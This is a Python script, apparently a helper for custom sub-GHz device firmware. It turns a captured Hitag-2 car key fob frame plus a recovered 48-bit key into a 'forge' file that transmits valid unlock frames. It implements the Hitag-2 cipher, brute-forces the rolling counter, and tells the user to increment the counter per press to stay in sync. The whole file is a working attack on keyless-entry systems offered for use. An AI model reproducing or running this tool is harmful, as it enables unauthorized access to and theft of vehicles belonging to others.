#!/usr/bin/env python3
"""Build a Hitag-2 FORGE .sub from a captured Hitag-2 .sub + a known 48-bit key.

Key recovery for Hitag-2 is a PC/GPU job (infeasible on the ESP32) — so the counter
recovery lives here too. Given a captured frame and the key, this:
  1. parses UID / button / low-10 counter / captured Ks from the .sub,
  2. brute-forces the 18 unknown high counter bits to find the full 28-bit counter
     whose keystream reproduces the captured Ks — which ALSO proves the key + the
     nonce/bit-order convention are correct for THIS fob,
  3. writes a forge .sub (adds `Hitag2Key` + `Counter`) the firmware's encoder emits.

Usage:  python hitag2_make_forge.py captured.sub 001122334455 [out.sub]
        (key = 12 hex chars = 48-bit on-air key)

The cipher below is the byte-verified reference (MIKRON ks32=0xD7237FCE), identical
to lib/subghz/protocols/hitag2_cipher.c.
"""
import re
import sys

M48 = (1 << 48) - 1
F4A, F4B, F5C = 0x2C79, 0x6671, 0x7907287B


def _i4(x, a, b, c, d):
    return ((x >> a) & 1) | (((x >> b) & 1) << 1) | (((x >> c) & 1) << 2) | (((x >> d) & 1) << 3)


def _f20(x):
    i5 = ((F4A >> _i4(x, 1, 2, 4, 5)) & 1) + ((F4B >> _i4(x, 7, 11, 13, 14)) & 1) * 2 \
        + ((F4B >> _i4(x, 16, 20, 22, 25)) & 1) * 4 + ((F4B >> _i4(x, 27, 28, 30, 32)) & 1) * 8 \
        + ((F4A >> _i4(x, 33, 42, 43, 45)) & 1) * 16
    return (F5C >> i5) & 1


def _round(s):
    x = s[0]
    fb = ((x >> 0) ^ (x >> 2) ^ (x >> 3) ^ (x >> 6) ^ (x >> 7) ^ (x >> 8) ^ (x >> 16) ^ (x >> 22)
          ^ (x >> 23) ^ (x >> 26) ^ (x >> 30) ^ (x >> 41) ^ (x >> 42) ^ (x >> 43) ^ (x >> 46)
          ^ (x >> 47)) & 1
    x = ((x >> 1) | (fb << 47)) & M48
    s[0] = x
    return _f20(x)


def _init(key, serial, iv):
    x = (((key & 0xFFFF) << 32) | serial) & M48
    for i in range(32):
        x >>= 1
        b = _f20(x) ^ (((iv >> i) ^ (key >> (i + 16))) & 1)
        x = (x | (b << 47)) & M48
    return x


def _rev(v, n):
    r = 0
    for _ in range(n):
        r = (r << 1) | (v & 1)
        v >>= 1
    return r


def rke_ks(key, uid, counter, btn):
    nonce = ((counter & 0x0FFFFFFF) << 4) | (btn & 0xF)
    s = [_init(_rev(key, 48), _rev(uid, 32), _rev(nonce, 32))]
    v = 0
    for _ in range(4):
        v = (v << 8) | sum(_round(s) << (i ^ 7) for i in range(8))
    return v


def recover_counter(key, uid, lctr10, btn, ks):
    for hi in range(1 << 18):
        c = (hi << 10) | (lctr10 & 0x3FF)
        if rke_ks(key, uid, c, btn) == ks:
            return c
    return None


def _read_field(text, name):
    m = re.search(rf"^{name}:\s*(.+)$", text, re.MULTILINE)
    return m.group(1).strip() if m else None


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    path, keyhex = sys.argv[1], sys.argv[2].replace(" ", "")
    out = sys.argv[3] if len(sys.argv) > 3 else path.rsplit(".", 1)[0] + "_forge.sub"
    key = int(keyhex, 16)
    text = open(path, encoding="utf-8", errors="ignore").read()

    if (_read_field(text, "Protocol") or "").lower() != "hitag2":
        print("ERROR: not a Hitag2 .sub"); return 1
    data = int(_read_field(text, "Key").replace(" ", ""), 16)  # generic 64-bit frame data
    ks = int(_read_field(text, "Ks"))
    uid = (data >> 32) & 0xFFFFFFFF
    btn = (data >> 28) & 0xF
    lctr10 = (data >> 18) & 0x3FF
    print(f"UID={uid:08X} btn={btn:X} lctr(low10)={lctr10:03X} Ks={ks & 0xFFFFFFFF:08X}")

    print("recovering full counter (validates key on your fob)...")
    counter = recover_counter(key, uid, lctr10, btn, ks & 0xFFFFFFFF)
    if counter is None:
        print("FAILED: no counter reproduces the captured Ks.\n"
              "-> the key is wrong for this fob, or this variant uses a different nonce/bit "
              "convention. The forge would emit invalid frames, so nothing was written.")
        return 1
    print(f"OK: full counter = 0x{counter:07X} ({counter}). Key + convention VERIFIED on this fob.")

    kb = " ".join(f"{(key >> (8 * (5 - i))) & 0xFF:02X}" for i in range(6))
    forged = text.rstrip("\n") + f"\nHitag2Key: {kb}\nCounter: {counter}\n"
    open(out, "w", encoding="utf-8", newline="\n").write(forged)
    print(f"wrote forge .sub -> {out}\n"
          f"Load it on the device and transmit: each send forges the frame for the stored\n"
          f"Counter. Bump 'Counter' by +1 for the next press (stays desync-safe).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
